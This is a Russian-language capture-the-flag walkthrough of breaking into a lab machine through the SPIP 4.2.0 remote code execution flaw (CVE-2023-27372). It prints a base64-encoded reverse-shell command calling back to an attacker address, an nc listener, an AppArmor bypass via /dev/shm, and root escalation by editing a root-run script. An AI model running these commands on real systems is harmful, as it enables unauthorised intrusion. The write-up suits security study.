### Получение шелла
По классике начинаем со скана портов. Масскан ничего интересного не выявил, по нмапу видим, что на сайте стоит довольно старенький апаче, но в принципе
ничего полезного


<img width="785" height="464" alt="image" src="https://github.com/user-attachments/assets/02c28b0a-5c15-4a56-97b0-6581ce731d50" />


Переходим на сайт. Сам сайт пустой - почти все ссылки некликабельны, в коде страницы ничего полезного. Еще и все на французском. Короче, делать тут нечего


<img width="785" height="450" alt="image" src="https://github.com/user-attachments/assets/8aab2c98-7c80-483d-88be-8303439412cb" />


Ну, и логично следующим шагом будет заффазить директории (```ffuf -u http://ip/FUZZ -w rockyou.txt:FUZZ -e .php,.html```).
Таким образом находим поддиректорию spip. Переходим по адресу. Там видим строку поиска, сразу прогоняем ее через sqlmap - поле неуязвимо
```
sqlmap -u "http://10.114.163.201/spip/spip.php?page=recherche&recherche=ds" \
--batch \
--level 5 --risk 3 \
--random-agent \
--threads 5
```
На сайте также есть возможность писать комментарии. Быстрая проверка на уязвимость к ssti или xxe(в поиске и комментариях) тоже не дала результатов. Проверила код страницы - и, о чудо, - увидела версию spip - 4.2.0 - старая.
на нее есть эксплойты. Используем эксплойт на уязвимость CVE-2023-27372 с RCE. Из-за того что команда с реверс шеллом у меня ломалась из-за кавычек - я ее просто закодировала ее в base64, чтобы избежать подобных проблем

``` python3 spip_exploit.py -u http://10.114.163.201/spip -c "echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1NC4xNjEvNDQ0NCAwPiYxJw== | base64 -d | bash" ```

поднимаем у себя порт ```nc -lvnp 5555``` и ловим реверсшелл за пользователя www-data, там же можем найти user.txt

<img width="387" height="32" alt="image" src="https://github.com/user-attachments/assets/59cf49a5-704c-414c-810f-c305d3a69ed2" />

### Взятие рута

Сразу можно подметить, что у нас много файлов, владельцем которых является юзер think. Предполагаю, что нам сначала придется взять его, а через него уже выйти рута.
Также, судя по имени машины, мы находимся в докер контейнере, на котором почти никакие команды не доступны (ни curl, ни wget, ни python для pty - ну и отстой), а оболочка у нас - ash. Посмотрим файлы

<img width="785" height="451" alt="image" src="https://github.com/user-attachments/assets/c6b7c92d-86dc-43ad-ba7e-8ef331cf2bc0" />

Находим открытый приватный ssh ключ - теперь мы можем спокойно подключиться к машине под пользователем think. Теперь утилит у нас в распоряжении побольше.
Подняла сервер (```python3 -m http.server 80```) и попыталась загрузить linpeas в tmp - выдало Permission denied, видимо, стоит защита. Попробовала также классическую папку для записи - /dev/shm. Сработало. Загрузила скрипт туда и запустила.
В принципе, там высветились и уязвимости ядра, но решила их не пробовать и пойти по пути, задуманным автором.
Анализируем, что еще выдал линпис - видим, что у нас установлен suid у какого-то непонятного бинарника docker_run.

<img width="785" height="117" alt="image" src="https://github.com/user-attachments/assets/9288f298-406b-43cd-87fd-52fb7aea9796" />

Поднимаем сервер на машине, скачиваем к себе этот файл, и пропускаем через ```ghidra```. Теперь можем увидеть читаемый, декомпилированный код. 

<img width="785" height="400" alt="image" src="https://github.com/user-attachments/assets/c0875db2-a1e1-479f-b7ef-f9162f2651e4" />

Я думала над тем, чтобы передать ему аргументы так, чтобы выйти на рута через него (что-то вроде ```./run_container '; /bin/bash -p'```), но попытки успехом не увенчались.
Поэтому посмотрим, что происходит в скрипте /opt/run_container.sh/. Снова ничего полезного, да и редактировать мы его не можем, хотя нам это, очевидно, нужно (слишком очевидный вектор атаки)

<img width="785" height="810" alt="image" src="https://github.com/user-attachments/assets/ac8ecbb7-f2f6-46a8-a7e6-13b04b6ef1ad" />

Решила попробовать посмотреть файлы в аппармаре, чтобы разобраться в ограничениях. И вот в файле ```usr.sbin.ash``` мы видим:

<img width="400" height="300" alt="image" src="https://github.com/user-attachments/assets/f99bc2fa-2a3e-4056-8932-93562f531bff" />

Это объясняет, почему я смогла устанавливать файлы в /dev/shm - мисконфиг. И мы видим, что файлы из директории /usr/bin выполнять можно.
То есть, мы в теории можем даже запустить /usr/bin/bash, но проблема в том, что он унаследует все ограничения ash. Тогда я решила попробовать скопировать его
в папку, где разрешена запись

```cp /usr/bin/bash /dev/shm/```

Теперь можно запустить bash, не унаследовав ограничения apparmor. Запускаем (```/dev/shm/bash```). Теперь мы можем отредактировать файл ```run_container.sh```,
чтобы вклиниться в исполняемый от рута скрипт 
(для этого добавила в конце скрипта ```/bin/bash -p```). Теперь запускаем программу и она благополучно запускает нужный нам процесс (не спрашивайте, почему я первым делом в оболочке запустила ls...хз...)

<img width="785" height="351" alt="image" src="https://github.com/user-attachments/assets/ef94e72f-8583-4a33-9735-f72b736766ae" />
<img width="785" height="60" alt="image" src="https://github.com/user-attachments/assets/18a275e7-1f9b-46a2-b177-fa53f86b1545" />

Переходим в /root и читаем флаг. рут взят! бастилия пала! 
